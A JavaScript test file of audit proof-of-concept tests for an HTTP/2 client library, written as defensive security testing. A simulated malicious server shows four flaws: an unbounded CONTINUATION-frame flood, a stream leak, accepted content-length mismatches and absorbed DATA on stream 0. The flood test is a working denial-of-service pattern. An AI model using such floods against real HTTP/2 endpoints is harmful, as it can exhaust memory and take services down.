// Adversarial audit PoCs: a MALICIOUS SERVER controlling every frame.
// Each test demonstrates a concrete flaw; see the audit report for the property each breaks.

import test from 'node:test';
import assert from 'node:assert/strict';
import { Http2Connection } from '../../src/http2/connection.js';
import { duplexPair } from '../_harness.js';
import { h2Server, readBodyText } from './_server.js';
import { FRAME, FLAG, SETTINGS } from '../../src/http2/constants.js';
import { serializeFrame } from '../../src/http2/frames.js';

const enc = new TextEncoder();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function connect(opts = {}) {
  const { a, b } = duplexPair();
  const server = h2Server(b, opts.server);
  const conn = new Http2Connection(a, opts.client);
  return { conn, server };
}
function awaitRequest(server, streamId) {
  return server.waitForFrame((f) => f.type === FRAME.HEADERS && f.streamId === streamId);
}

// FINDING 1 — CONTINUATION flood: no cap on accumulated header-block fragments (Property 5).
test('FINDING 1: CONTINUATION flood accumulates without bound and never fails closed', async () => {
  // maxHeaderListSize is deliberately tiny; it bounds DECODED output only, never the raw
  // fragments buffered during assembly.
  const { conn, server } = connect({ client: { maxHeaderListSize: 1024 } });
  const reqP = conn.request({ method: 'GET', scheme: 'https', authority: 'h', path: '/', headers: [] });
  reqP.catch(() => {}); // this stream's head never resolves; silence the rejection on close()
  await awaitRequest(server, 1);

  // A HEADERS frame on stream 1 WITHOUT END_HEADERS opens a continuation run.
  await server.sendRaw(serializeFrame(FRAME.HEADERS, 0, 1, new Uint8Array(0)));

  // Flood: CONTINUATION frames, each the full 16 KiB max frame size, none carrying END_HEADERS.
  const chunk = new Uint8Array(16384);
  const FLOOD = 256; // 256 * 16 KiB = 4 MiB — 4000x over the 1 KiB header-list "cap"
  for (let i = 0; i < FLOOD; i++) {
    await server.sendRaw(serializeFrame(FRAME.CONTINUATION, 0, 1, chunk));
  }
  await sleep(60);

  assert.equal(conn._fatal, null, 'connection did NOT fail closed after buffering 4 MiB of fragments');
  assert.ok(conn._continuation, 'still mid-continuation, holding every fragment');
  const buffered = conn._continuation.fragments.reduce((s, f) => s + f.byteLength, 0);
  assert.ok(
    buffered >= FLOOD * 16384,
    `client buffered ${buffered} bytes with no cap — a real peer could push this to OOM`,
  );
  await conn.close();
});

// FINDING 2 — a completed stream leaks from _streams when the server ends the response before the
// client finishes uploading its request body (Property 5 / resource-exhaustion, liveness).
test('FINDING 2: stream leaks when server ends response before client body upload completes', async () => {
  const { conn, server } = connect();
  // 70000 > the default 65535 connection send window, so _sendBody MUST block mid-upload
  // regardless of any SETTINGS race — deterministic.
  const body = new Uint8Array(70000);
  const reqP = conn.request({
    method: 'POST',
    scheme: 'https',
    authority: 'h',
    path: '/',
    headers: [['content-length', '70000']],
    body,
  });
  await awaitRequest(server, 1);

  // Server delivers the COMPLETE response (END_STREAM) while the client is still blocked on the
  // connection send window, so recvEnded becomes true while localEnded is still false.
  await server.sendResponse(1, [{ name: ':status', value: '200' }], { endStream: true });
  const res = await reqP;
  assert.equal(res.status, 200);
  assert.equal(await res.body.completed, true, 'remote half ended');

  // Now let the client finish its upload: grant connection + stream window.
  await server.sendWindowUpdate(0, 1_000_000);
  await server.sendWindowUpdate(1, 1_000_000);
  await sleep(40);

  const req = server.requests.get(1);
  const got = req.body.reduce((s, c) => s + c.byteLength, 0);
  assert.equal(got, 70000, 'client finished sending the whole body (localEnded is now true)');
  assert.equal(req.ended, true, 'the final client DATA carried END_STREAM');

  // Both halves have ended, yet the stream is still registered: the local-end path in _sendBody
  // never re-checks _maybeCloseStream, so the stream is never removed.
  assert.equal(conn.activeStreams, 1, 'LEAK: stream still counted after both sides fully ended');
  await conn.close();
});

// FINDING 3 — an h2 response whose DATA disagrees with its declared content-length is accepted
// silently; RFC 9113 s8.1.1 calls this malformed (Property 6: ambiguity must be an error).
test('FINDING 3: DATA exceeding declared content-length is accepted without error', async () => {
  const { conn, server } = connect();
  const reqP = conn.request({ method: 'GET', scheme: 'https', authority: 'h', path: '/', headers: [] });
  await awaitRequest(server, 1);

  await server.sendResponse(1, [
    { name: ':status', value: '200' },
    { name: 'content-length', value: '3' },
  ]);
  await server.sendData(1, enc.encode('hello world'), true); // 11 bytes, END_STREAM

  const res = await reqP;
  assert.equal(res.status, 200);
  assert.equal(res.headers.get('content-length'), '3');
  const text = await readBodyText(res.body);
  assert.equal(text, 'hello world', 'all 11 bytes delivered despite content-length: 3');
  assert.equal(await res.body.completed, true, 'stream completed cleanly — no malformed-body error');
  assert.equal(conn._fatal, null, 'connection never flagged the mismatch');
  await conn.close();
});

// CONTROL — a byte-for-byte comparison showing DATA on stream 0 is silently absorbed rather than
// being the connection PROTOCOL_ERROR RFC 9113 s6.1 requires (Property 6, minor).
test('OBSERVATION: DATA on stream 0 is absorbed, not a connection error', async () => {
  const { conn, server } = connect();
  const reqP = conn.request({ method: 'GET', scheme: 'https', authority: 'h', path: '/', headers: [] });
  reqP.catch(() => {});
  await awaitRequest(server, 1);
  await server.ready;
  await server.sendRaw(serializeFrame(FRAME.DATA, 0, 0, enc.encode('junk on stream 0')));
  await sleep(30);
  assert.equal(conn._fatal, null, 'DATA on stream 0 did not fail the connection (should be PROTOCOL_ERROR)');
  await conn.close();
});
